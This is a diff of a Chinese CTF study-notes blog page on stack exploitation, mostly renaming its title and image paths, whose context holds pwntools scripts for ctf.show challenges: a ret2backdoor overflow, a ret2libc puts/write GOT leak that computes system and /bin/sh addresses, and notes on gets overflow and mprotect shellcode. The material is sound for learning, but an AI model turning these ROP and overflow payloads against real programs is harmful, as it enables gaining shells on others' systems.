@@ -9,14 +9,14 @@
 
 <meta charset="utf-8" >
 
-<title>PWN_CTF</title>
-<meta name="keywords" content="PWN_CTF, Kidder1&#39;s Blog!">
-<meta name="description" content="Pwn_CTF刷题和知识点记录">
+<title>PWN_CTF_Stack</title>
+<meta name="keywords" content="PWN_CTF_Stack, Kidder1&#39;s Blog!">
+<meta name="description" content="Pwn_CTF刷题和知识点记录:栈部分">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta property="og:title" content="PWN_CTF">
-<meta property="og:description" content="Pwn_CTF刷题和知识点记录">
+<meta property="og:title" content="PWN_CTF_Stack">
+<meta property="og:description" content="Pwn_CTF刷题和知识点记录:栈部分">
 
 <link rel="shortcut icon" href="/favicon.ico">
 <link rel="stylesheet" href="/style/main.css">
@@ -83,7 +83,7 @@
   <div class="content-container">
     <div class="post-detail">
       
-      <h2 class="post-title">PWN_CTF</h2>
+      <h2 class="post-title">PWN_CTF_Stack</h2>
       <div class="post-info post-detail-info">
         <span><i class="icon icon-calendar-outline"></i> 2023-07-24</span>
         
@@ -107,11 +107,11 @@
 <p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p>
 </blockquote>
 <p>GDB测偏移</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725170934385.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725170934385.png"  class="" lazyload></a>
 
 <p>关于栈平衡的问题：如果正常的payload打不通，就在payload前面加一个ret的地址进行栈平衡，让继续执行下一个指令。</p>
 <p>gdb调试system成功，rbp下面就是返回地址，可以通过gdb查看是否改写成功。</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725184203864.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725184203864.png"  class="" lazyload></a>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400657</span></span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) +p64(ret)+p64(backdoor)<span class="comment"># 放一个ret平衡栈，在rop链子的前面</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -158,7 +158,7 @@
 <ul>
 <li>注意bss段的buf可以手动构造bin&#x2F;sh字符串作为参数传入。</li>
 </ul>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230728173933897.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230728173933897.png"  class="" lazyload></a>
 
 <ul>
 <li>gets函数没有输入的长度限制，可以一直输入直至回车键</li>
@@ -181,19 +181,19 @@
 <li><p>gdb的调试过程：通过查看内存变量观察函数的调用过程    通过观察主函数的返回地址观察函数调用过程</p>
 <ol>
 <li><p>先通过finish运行到主函数内部进行查看</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224725259.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731224725259.png"  class="" lazyload></a>
 </li>
 <li><p>然后发现主函数返回到gets函数</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224947918.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731224947918.png"  class="" lazyload></a>
 </li>
 <li><p>查看gets的系统调用执行</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225224295.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225224295.png"  class="" lazyload></a>
 </li>
 <li><p>通过finish查看gets的返回地址是pop ebx 然后ret到system执行，在这里只是pop  ebx只是作为一个跳板，只是为了返回到system地址进行getshell而已</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225354257.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225354257.png"  class="" lazyload></a>
 </li>
 <li><p>发现一致</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225807535.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225807535.png"  class="" lazyload></a>
 </li>
 <li><p>这里还有一个简单的思路：通过覆盖gets的返回地址为system，然后让system的返回地址为buf2同时作为gets的参数也可以getshell，这个原理就是每个函数调用的参数返回地址等，与其他函数的调用无关。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(system) + p32(buf2)+ p32(buf2)</span><br></pre></td></tr></table></figure></li>
@@ -205,20 +205,20 @@
 <p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。这里注意要对泄露的函数原型进行查看，对payload要完成传参。</p>
 <p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p>
 </blockquote>
-<h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731145442576.png"  class="" lazyload></a></p>
+<h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731145442576.png"  class="" lazyload></a></p>
 <p>查询libc偏移和版本的网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x08048356</span></span><br><span class="line">lg(<span class="string">&#x27;puts plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;write plt&#x27;</span>, write_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过打印获得puts的地址</span></span><br><span class="line"><span class="comment"># read 0xC8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>)  </span><br><span class="line"><span class="comment"># 这里的返回地址写成main函数可以让这个payload执行完毕之后，再一次进行溢出</span></span><br><span class="line">payload += p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 因为小端序 倒取四个字节</span></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过puts的地址获取libc的地址</span></span><br><span class="line"><span class="comment"># puts_addr = 0xf7d6b360</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x067360</span></span><br><span class="line">system_plt = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh =  libc_base + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>) </span><br><span class="line">payload += p32(system_plt) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>这里的接收的&#x2F;x7f，因为libc的地址是六位，前两位是00不显示。又因为接收的的字节，所以用u64解包，并且高位用00补全八位</p>
 <blockquote>
 <p>0x 7f ff f7 e1 50 00<br>puts_addr &#x3D; p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’）</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173353357.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731173353357.png"  class="" lazyload></a>
 <p>puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173459832.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731173459832.png"  class="" lazyload></a>
 </blockquote>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731172534065.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731172534065.png"  class="" lazyload></a>
 
-<h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801164558925.png"  class="" lazyload></a>
+<h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230801164558925.png"  class="" lazyload></a>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure>
 
@@ -229,7 +229,7 @@
 <li>count：每次写入的字节数</li>
 </ul>
 <p>但是看看gadget，只能控制rdi和rsi，r15不能控制，这种情况一般是没有用的padding给填充位置，或者没办法控制。</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801211525162.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230801211525162.png"  class="" lazyload></a>
 
 <h2 id="pwn47-48（ret2libc-LibcSeacher）"><a href="#pwn47-48（ret2libc-LibcSeacher）" class="headerlink" title="pwn47&#x2F;48（ret2libc - LibcSeacher）"></a>pwn47&#x2F;48（ret2libc - LibcSeacher）</h2><h3 id="四个libc目录区别"><a href="#四个libc目录区别" class="headerlink" title="四个libc目录区别"></a>四个libc目录区别</h3><blockquote>
 <p>在Linux系统中，这四个目录(lib, lib32, lib64, libx32)是用来存放共享库文件的目录，它们之间有一些区别，具体如下：</p>
@@ -254,7 +254,7 @@
 <p>用vmmap查看内存布局的时候，可以看到stack是不可执行状态，所以我们要使用mprotect函数修改可执行权限</p>
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x8048000  <span class="number">0</span>x80d7000  r-xp    <span class="number">8</span>f000      <span class="number">0</span> /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80d8000  <span class="number">0</span>x80dc000  rw-p     <span class="number">4000</span>  <span class="number">8</span>f000 /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80dc000  <span class="number">0</span>x80ff000  rw-p    <span class="number">23000</span>      <span class="number">0</span> [heap]</span><br><span class="line"><span class="number">0</span>xf7ff8000 <span class="number">0</span>xf7ffc000 r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line"><span class="number">0</span>xf7ffc000 <span class="number">0</span>xf7ffe000 r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000 rw-p    <span class="number">21000</span>      <span class="number">0</span> [stack]</span><br></pre></td></tr></table></figure>
 
-<h3 id="mprotect函数原型"><a href="#mprotect函数原型" class="headerlink" title="mprotect函数原型"></a>mprotect函数原型</h3><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230803175812533.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230803175812533.png"  class="" lazyload></a>
+<h3 id="mprotect函数原型"><a href="#mprotect函数原型" class="headerlink" title="mprotect函数原型"></a>mprotect函数原型</h3><a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230803175812533.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230803175812533.png"  class="" lazyload></a>
 
 <p>这里的注意点就两个：</p>
 <ol>
@@ -397,7 +397,7 @@
 <p>gdb调试查看,发现奥秘了,leave会将栈空间清除，导致main函数栈空间的局部变量等都会受到影响。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x8048545 &lt;ctfshow+47&gt;    mov    ebx, dword ptr [ebp - 4]      &lt;_GLOBAL_OFFSET_TABLE_&gt;</span><br><span class="line">0x8048548 &lt;ctfshow+50&gt;    leave  </span><br><span class="line">0x8048549 &lt;ctfshow+51&gt;    ret    </span><br></pre></td></tr></table></figure>
 
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230816015043315.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230816015043315.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230816015043315.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230816015043315.png"  class="" lazyload></a>
 
 <p>栈空间在leave之后，刚好作为返回地址继续执行shellcode。</p>
 <h2 id="pwn60-vmmap本地权限问题"><a href="#pwn60-vmmap本地权限问题" class="headerlink" title="pwn60(vmmap本地权限问题)"></a>pwn60(vmmap本地权限问题)</h2><p>在pwn60中，题目是一个很简单的题目，但是这里还是有一个关于vmmap的小点记录一下<br>先看解题代码</p>
@@ -539,11 +539,11 @@
 <h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol>
 <li>直接用ida查看0x10 + 8</li>
 </ol>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121502497.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725121502497.png"  class="" lazyload></a>
 
 <ol start="2">
 <li><p>gdb覆盖查看，从rsp到rbp</p>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121544874.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725121544874.png"  class="" lazyload></a>
 </li>
 <li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p>
 <p>这道题根据偏移直接送结果就可以了</p>
@@ -552,7 +552,7 @@
 <h3 id="gdb查看内存命令"><a href="#gdb查看内存命令" class="headerlink" title="gdb查看内存命令"></a>gdb查看内存命令</h3><blockquote>
 <p>&#x2F;s                 查看相应地址的字符串<br>x&#x2F;i 		       查看汇编指令<br>x&#x2F;gx			 查看相应地址的二进制信息<br>x&#x2F;wx			按照字节形式显示二进制信息</p>
 </blockquote>
-<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-1676879380338.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-1676879380338.png"  class="" lazyload></a>
+<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-1676879380338.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-1676879380338.png"  class="" lazyload></a>
 
 
 
